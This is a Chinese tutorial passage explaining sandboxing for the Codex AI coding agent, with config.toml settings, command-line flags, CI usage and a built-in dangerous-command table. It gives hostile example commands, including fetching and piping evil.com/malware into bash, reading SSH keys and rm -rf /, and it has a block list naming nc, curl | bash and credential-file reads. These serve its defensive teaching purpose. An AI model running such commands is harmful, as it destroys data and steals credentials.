- 理解沙箱在 AI Agent 中的必要性

## 1. 为什么需要沙箱

AI Agent 可以执行任意 shell 命令。没有沙箱：

```bash
# 恶意提示词可能导致：
rm -rf /                      # 删除整个文件系统
curl evil.com/malware | bash  # 下载并执行恶意代码
cat ~/.ssh/id_rsa             # 窃取 SSH 密钥
aws s3 ls                     # 访问云资源
```

沙箱（Sandbox）的核心目标：**限制 Codex 的操作范围，即使被恶意提示词攻击，也不会影响沙箱外的系统**。

## 3. 沙箱配置

### 3.1 在 config.toml 中配置

```toml
[sandbox]
enabled = true               # 是否启用沙箱
network = false              # 是否允许网络访问

# 可写目录白名单（相对于项目根目录）
writable = [
  "src/",
  "tests/",
  "docs/",
  "package.json",
  "tsconfig.json"
]

# 可读目录（默认项目根目录）
readable = ["."]
```

### 3.2 命令行参数

```bash
# 禁用沙箱（不推荐！）
codex --sandbox=false

# 允许网络访问
codex --sandbox-network=true

# 指定可写目录
codex --sandbox-writable=src/,tests/
```

## 4. 常见安全场景

### 4.1 安装依赖需要网络

```toml
# .codex/config.toml
[sandbox]
network = true   # 临时允许网络

# 或在 REPL 中手动确认安装
> 安装 lodash
🔧 执行命令: npm install lodash
⚠️ 需要网络访问权限，允许？[y/N] > y
✅ 已安装 lodash
```

### 4.2 数据库迁移需要特定权限

```markdown
<!-- AGENTS.md -->
## 注意事项
- 数据库迁移命令 `npx prisma migrate dev` 需要网络访问数据库
- 运行迁移前请先询问我
```

### 4.3 CI/CD 中的沙箱

```yaml
# GitHub Actions 中使用 Full-Auto + 严格沙箱
- name: Codex Auto Fix
  run: codex exec --approval full-auto "修复 lint 错误"
  env:
    OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
```

## 5. 危险操作防护

Codex 内置了危险命令黑名单，即使在 Full-Auto 模式也会拦截：

| 类别 | 示例 | 处理 |
|------|------|------|
| 文件删除 | `rm -rf /`、`rm -rf ~` | 自动拦截 |
| 权限提升 | `sudo`、`su` | 自动拦截 |
| 网络后门 | `nc -l`、`curl \| bash` | 需确认 |
| 敏感文件 | `cat ~/.ssh/*`、`cat ~/.aws/*` | 需确认 |
| 系统破坏 | `mkfs`、`dd if=/dev/zero` | 自动拦截 |

---

## 小结

- 沙箱是 AI Agent 的核心安全防线
- macOS 用 Seatbelt，Linux 用 Bubblewrap
- 通过 config.toml 和命令行参数控制沙箱权限
- 内置危险命令黑名单提供额外保护
- CI/CD 中配合 Full-Auto 使用效果最佳
